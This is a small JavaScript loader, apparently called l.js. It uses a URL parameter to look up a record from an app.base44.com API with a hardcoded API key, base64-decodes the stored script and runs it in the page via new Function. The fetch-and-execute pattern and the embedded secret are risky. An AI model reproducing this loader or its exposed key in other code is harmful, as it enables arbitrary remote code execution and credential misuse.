(function () {
  function getQueryParam(name) {
    return new URLSearchParams(window.location.search).get(name);
  }

  const uniqueId = getQueryParam("unique_id");

  if (!uniqueId) {
    console.error("l.js: No unique_id provided.");
    return;
  }

  fetch(
    "https://app.base44.com/api/apps/6812ad73a9594a183279deba/entities/DataRecord?user_id=user_jveo8b35q_1748241619184&payload.unique_id=" + uniqueId,
    {
      headers: {
        "api_key": "69315aa5aa7f4b6fa99c7a420da68bdd",
        "Content-Type": "application/json",
      },
    }
  )
    .then((res) => res.json())
    .then((records) => {
      if (!records.length) {
        console.error("l.js: Script not found for ID " + uniqueId);
        return;
      }

      const file = records[0].payload;
      let decoded;
      try {
        decoded = atob(file.file_content);
      } catch (e) {
        console.error("l.js: Failed to decode script content.");
        return;
      }

      try {
        // Dynamically evaluate the decoded script in the page context
        new Function(decoded)();
        console.log("l.js: Script executed successfully.");
      } catch (e) {
        console.error("l.js: Error executing script ->", e);
      }
    })
    .catch((err) => {
      console.error("l.js: Failed to fetch script.", err);
    });
})();
